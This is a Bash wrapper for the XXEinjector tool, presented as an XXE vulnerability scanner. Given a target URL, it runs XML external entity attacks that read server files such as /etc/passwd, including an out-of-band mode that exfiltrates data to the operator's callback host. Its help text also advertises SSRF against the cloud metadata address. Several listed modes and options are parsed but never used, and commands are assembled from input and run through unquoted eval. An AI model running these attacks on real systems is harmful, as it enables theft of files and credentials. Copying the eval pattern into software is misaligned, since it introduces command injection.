#!/bin/bash

# ==========================================
# SMART-HUNTER XXE Vulnerability Scanner
# Wrapper for XXEinjector
# ==========================================

# Text Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default values
MODE="full"
HOST=""
COLLABORATOR=""
FILE_TO_READ="/etc/passwd"
INTERNAL_URL="http://169.254.169.254/"
UPLOAD_ENDPOINT="/upload"

function show_help() {
    echo -e "${BLUE}SMART-HUNTER XXE Scanner${NC}"
    echo "Usage: ./run_xxe.sh <target_url> [options]"
    echo ""
    echo "Modes:"
    echo "  --mode=detect        Initial detection - does it process XML?"
    echo "  --mode=classic       Direct XXE to read files (in-band)"
    echo "  --mode=blind-oob     Blind XXE with out-of-band interaction"
    echo "  --mode=blind-exfil   Blind XXE data exfiltration via external DTD"
    echo "  --mode=error-based   Data extraction via error messages"
    echo "  --mode=ssrf          Exploit XXE to access internal services"
    echo "  --mode=xinclude      XInclude injection (no DOCTYPE)"
    echo "  --mode=svg-upload    XXE via SVG file upload"
    echo "  --mode=full          (Default) Comprehensive scan trying all methods"
    echo ""
    echo "Options:"
    echo "  --host=IP            Your IP address (required for callback servers)"
    echo "  --collaborator=URL   Your Burp Collaborator or Interactsh URL"
    echo "  --file=PATH          File to read (default: /etc/passwd)"
    echo "  --internal-url=URL   Internal URL for SSRF (default: http://169.254.169.254/)"
    echo "  --upload-endpoint=URI Endpoint for SVG upload (default: /upload)"
    echo ""
    echo "Example:"
    echo "  ./run_xxe.sh http://target.com/api --mode=blind-oob --host=10.0.0.5 --collaborator=xyz.burpcollaborator.net"
}

# Parse Arguments
if [ "$#" -eq 0 ]; then
    show_help
    exit 1
fi

if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    show_help
    exit 0
fi

TARGET="$1"
shift

while [ "$#" -gt 0 ]; do
  case "$1" in
    --mode=*) MODE="${1#*=}"; shift 1;;
    --host=*) HOST="${1#*=}"; shift 1;;
    --collaborator=*) COLLABORATOR="${1#*=}"; shift 1;;
    --file=*) FILE_TO_READ="${1#*=}"; shift 1;;
    --internal-url=*) INTERNAL_URL="${1#*=}"; shift 1;;
    --upload-endpoint=*) UPLOAD_ENDPOINT="${1#*=}"; shift 1;;
    *) echo "Unknown parameter passed: $1"; exit 1;;
  esac
done

echo -e "${YELLOW}[!] WARNING: This tool is for use in authorized environments only.${NC}"
echo -e "${BLUE}[*] Target: ${TARGET}${NC}"
echo -e "${BLUE}[*] Mode: ${MODE}${NC}"

# Check Dependencies
if ! command -v ruby &> /dev/null; then
    echo -e "${RED}[-] Ruby is not installed. XXEinjector requires Ruby.${NC}"
    exit 1
fi

if [ ! -d "XXEinjector" ]; then
    echo -e "${RED}[-] XXEinjector directory not found. Please ensure it was cloned properly.${NC}"
    exit 1
fi

# Setup Results Directory
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
RESULTS_DIR="results/xxe_${TIMESTAMP}"
mkdir -p "$RESULTS_DIR"

# Start Time for duration calculation
START_TIME=$(date +%s)

# --- Execution Logic (Simplified for demonstration) ---
echo -e "${YELLOW}[*] Preparing payload and template...${NC}"

# 1. Prepare HTTP Request file (based on mode, usually needs a template)
# For this script, we'll use a generic template or the user can specify one.
# Let's create a temporary request file for XXEinjector
TEMP_REQ="xxe_temp_request.txt"
cat xxe_templates/stock_check.txt | sed "s|TARGET_HOST|$(echo $TARGET | awk -F/ '{print $3}')|g" > "$TEMP_REQ"

# 2. Run XXEinjector
echo -e "${YELLOW}[*] Running XXEinjector...${NC}"

if [ "$MODE" = "full" ]; then
    echo -e "${YELLOW}[*] Full Mode: Running comprehensive tests (OOB, PHP Filter)...${NC}"
    
    echo -e "${BLUE}[*] Executing OOB Test...${NC}"
    COMMAND1="ruby XXEinjector/XXEinjector.rb --host=${HOST:-127.0.0.1} --file=${TEMP_REQ} --path=${FILE_TO_READ} --oob=http --output=${RESULTS_DIR}"
    eval $COMMAND1 >> "${RESULTS_DIR}/xxeinjector.log" 2>&1
    
    echo -e "${BLUE}[*] Executing PHP Filter Test...${NC}"
    COMMAND2="ruby XXEinjector/XXEinjector.rb --host=${HOST:-127.0.0.1} --file=${TEMP_REQ} --path=${FILE_TO_READ} --phpfilter --output=${RESULTS_DIR}"
    eval $COMMAND2 >> "${RESULTS_DIR}/xxeinjector.log" 2>&1
else
    COMMAND="ruby XXEinjector/XXEinjector.rb --host=${HOST:-127.0.0.1} --file=${TEMP_REQ} --path=${FILE_TO_READ} --output=${RESULTS_DIR}"
    if [ "$MODE" = "blind-oob" ]; then COMMAND="$COMMAND --oob=http"; fi
    if [ "$MODE" = "error-based" ]; then COMMAND="$COMMAND --expect"; fi

    echo -e "${BLUE}[*] Executing: $COMMAND${NC}"
    eval $COMMAND > "${RESULTS_DIR}/xxeinjector.log" 2>&1
fi

# End Time
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))
DURATION_STR="${DURATION}s"
if [ $DURATION -gt 60 ]; then
    DURATION_STR="$((DURATION / 60))m $((DURATION % 60))s"
fi

# Clean up temp
rm -f "$TEMP_REQ"

# 3. Analyze Results using Python Script
echo -e "${YELLOW}[*] Analysis complete. Generating report...${NC}"
python3 xxe_analyzer.py --target "$TARGET" --mode "$MODE" --duration "$DURATION_STR" --logdir "$RESULTS_DIR" > "${RESULTS_DIR}/report.txt"

# Print the report to console as well
cat "${RESULTS_DIR}/report.txt"

echo -e "${GREEN}[+] Scan finished. Full report saved to ${RESULTS_DIR}/report.txt${NC}"
